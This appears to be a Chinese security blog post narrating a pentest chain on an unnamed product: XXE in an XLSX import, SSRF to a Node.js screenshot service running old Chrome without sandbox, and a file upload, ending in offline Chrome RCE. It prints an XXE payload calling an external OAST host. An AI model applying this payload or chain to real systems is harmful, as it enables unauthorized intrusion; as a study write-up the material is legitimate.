#  XXE到Chrome RCE：一次完整的不出网利用实践  
 听风安全   2026-05-19 05:46  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/Tp9VOk1IaycpsK4AXvozeaMLYk7OBLQau8mDrsWslNiajkybyodE8HbkJ9ibPO7IofWw3S4sE38LyCWYSxSZMjkQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1&randomid=2pcrkst5&tp=webp#imgIndex=0 "")  
  
**免责声明**  
  
由于传播、利用本公众号听风安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号听风安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
公众号现在只对常读和星标的公众号才展示大图推送，  
  
建议大家把  
听风安全  
设为**星标**  
，否则可能就看不到啦！  
  
----------------------------------------------------------------------  
  
## 前言  
  
最近忙着审计一些通用设备，停更了一段时间。翻阅以前的笔记，挑选了一个XXE到RCE的经典案例来分享，希望能给大家带来一些启发。  
## 一、服务架构分析  
  
在完成目标系统的安装部署后，我对其Web服务架构进行了详细分析，发现该系统采用了双服务架构：  
- **主服务**  
：Tomcat应用服务器  
  
- **辅助服务**  
：Node.js实现的Web服务  
  
![服务架构图](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGicFx4xibczOKeAz1P3UtiaJVtOe7Yjb4oThtKJG4b752NB8RnsLThfMAQ/640?wx_fmt=png&from=appmsg "")  
  
服务架构图  
### 1.1 Node.js截图服务审计  
  
Node.js服务的核心代码位于 C:\xxxx\ScreenshotApp\server.js  
，从文件名可以看出这是一个截图应用。  
  
![代码结构](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGrfs2p1ySeIFVv0rYXrHcX9pykibozWsGeu4bnHNKXicAJ7tmeuoLibeWA/640?wx_fmt=png&from=appmsg "")  
  
代码结构  
  
**关键发现**  
：代码中调用了Chrome浏览器，并且**关闭了沙箱保护机制**  
（--no-sandbox  
参数）。  
  
![Chrome调用代码](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGJoBYIRtiaLf2k8FZYZk1NA9S0eWIjKfeAw5C5icxfOboKqdfESMLVqUw/640?wx_fmt=png&from=appmsg "")  
  
Chrome调用代码  
  
该服务接收用户传入的URL参数，使用Chrome打开目标页面并进行截图操作。  
  
![URL处理逻辑](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TG2bfUlTlz4qFu1zkibzjllHyOWiacFf1ia4Z88cicZyo6pDiamvcR2B6QSEA/640?wx_fmt=png&from=appmsg "")  
  
URL处理逻辑  
### 1.2 Chrome版本漏洞确认  
  
经过版本检查，发现系统使用的Chrome版本较低，**存在已知的RCE漏洞**  
。  
  
![Chrome漏洞](https://mmbiz.qpic.cn/sz_mmbiz_jpg/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGn3wM4IrxZs9EuerxeeTTY3tOPvq4cyhTibBJnotC9Q4JBbtyQhKU0mw/640?wx_fmt=jpeg&from=appmsg "")  
  
Chrome漏洞  
  
理论上可以直接使用Metasploit生成Payload进行利用。  
  
**但问题来了**  
：通过外网测绘发现，虽然该服务监听在0.0.0.0  
，但实际开放到公网的实例并不多。这意味着我们需要找到一个**SSRF漏洞**  
来间接访问这个内网服务。  
## 二、Excel导入功能的XXE漏洞挖掘  
### 2.1 漏洞点定位  
  
在Tomcat主应用中搜索了很久未授权的SSRF漏洞，未果。于是转变思路，开始寻找**XXE（XML外部实体注入）**  
漏洞，最终在Excel导入功能中找到了突破口。  
  
![Servlet代码](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGAxY9wmAN3Tf5vTibU1uFcTqRQ0ChHQbIfOLwkwufqWg4wxZgk8BD5BQ/640?wx_fmt=png&from=appmsg "")  
  
Servlet代码  
  
该Servlet的处理流程为：  
1. 接收用户上传的文件  
  
1. 解析Excel文件内容  
  
![解析流程1](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TG5Qavpa0RhzpgO8a5ic44hbc3o6qvj23FRB01FutvGAobicphsoA1YJ2w/640?wx_fmt=png&from=appmsg "")  
  
解析流程1  
  
![解析流程2](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGI66ibjTxmh3LVEicHF6c0WSriaoKyzMOicfaQrtVb7ianQiaPiba95AMxMKibA/640?wx_fmt=png&from=appmsg "")  
  
解析流程2  
### 2.2 XXE漏洞验证  
  
![XXE代码位置](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGHk7kOQTHW9hErhibt7Kibx0R8ibAPOApaZ5Px5zEd7KXr0NHtMxnibMsDQ/640?wx_fmt=png&from=appmsg "")  
  
XXE代码位置  
  
在解析XLSX文件时，程序对XML内容的处理**未禁用外部实体解析**  
，导致XXE漏洞。  
  
**PoC构造**  
：修改XLSX文件中的[Content_Types].xml  
：  
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [  <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://ukiayp51zrokeq6sm5h05cdit9zzno.oastify.com/111111">]><foo>&xxe;</foo>
```  
  
![修改后的文件](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGJve4er2qhr4dN50ZYjUxzj1Wbg8hawfhR6ykp9GBH0aOMo2CQyeJbQ/640?wx_fmt=png&from=appmsg "")  
  
修改后的文件  
  
上传修改后的XLSX文件：  
  
![上传操作](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGRrtgmNNGsV0WXLGaXWVK4sByzYllatXDgOyknvLHjbhLLibs7aEe25w/640?wx_fmt=png&from=appmsg "")  
  
上传操作  
  
**成功触发XXE**  
，收到外带请求：  
  
![XXE触发](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGD4L3MRyPq8fJ35Ao8uncgD26yibDXxDcMyp5UTnp9MTDGy85hibw9pFQ/640?wx_fmt=png&from=appmsg "")  
  
XXE触发  
## 三、不出网利用链构造  
### 3.1 初步利用思路  
  
此时我们已经可以通过XXE调用Node.js截图服务，并传入URL参数触发Chrome RCE。但这个方案存在一个问题：**需要外部服务器托管恶意Payload**  
。  
  
对于追求完美的渗透测试来说，我们希望实现**完全不出网的RCE利用**  
。  
### 3.2 寻找文件上传功能  
  
要实现不出网利用，我们需要找到一个**未授权的文件上传点**  
，要求：  
- ✅ 文件内容可控  
  
- ✅ 上传后可通过内部URL访问  
  
- ⚠️ 后缀名不需要可控  
  
经过进一步挖掘，找到了符合条件的Servlet：  
  
![文件上传功能](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGk9Ews6ojsskpo9OxfFULoBF33vJt6kXV9yYYzDmb0VQZq8RbHwfK7g/640?wx_fmt=png&from=appmsg "")  
  
文件上传功能  
  
![上传实现](https://mmbiz.qpic.cn/sz_mmbiz_png/AKz6F8hGbHXd70zyLUSD1e6txj72Q9TGiazgibHk8uNCe8HPSfWFfoIgBYBjC3J8lia1HqjniaD1nej7pLS3XKC31A/640?wx_fmt=png&from=appmsg "")  
  
上传实现  
### 3.3 完整利用链  
  
至此，完整的不出网RCE利用链构造完成：  
1. **第一步**  
：利用文件上传功能，上传包含Chrome RCE Payload的恶意文件（如HTML代码），获取其Web访问路径  
  
1. **第二步**  
：构造XXE Payload，将目标URL指向第一步上传的文件  
  
1. **第三步**  
：将XXE Payload嵌入XLSX文件并上传导入  
  
1. **第四步**  
：XXE触发 → SSRF访问Node.js服务 → Chrome打开恶意页面 → RCE成功  
  
## 四、技术疑问与思考  
  
在复盘这个案例时，我注意到一个有趣的问题：  
> **Chrome访问JPG文件时，其中包含的HTML代码也会被解析吗？**  
  
  
当时测试确实可行，但没有深入研究其原理。可能的原因包括：  
- Content-Type响应头的影响  
  
- Chrome的MIME类型嗅探机制  
  
- 文件扩展名与实际内容的处理逻辑  
  
感兴趣的朋友可以自行研究，欢迎交流讨论。  
## 总结  
  
这个案例展示了一个典型的**漏洞链组合利用**  
过程，展示了安全研究中"点-线-面"的思维方式。  
  
服务漏洞  
  
关键点在于：  
- 🔍 全面的服务架构分析  
  
- 🔗 多个漏洞的链式组合  
  
- 🎯 不出网利用的思路转换  
  
- 💡 对业务逻辑的深入理解  
  
希望这个案例能为大家在实战中提供一些思路启发！  
  
不可错过的往期推荐哦  
  
```
```  
  
  
点击下方名片，关注我们  
  
  
觉得内容不错，就点下  
“**赞**  
”  
和  
“**在看**  
”  
  
  
  
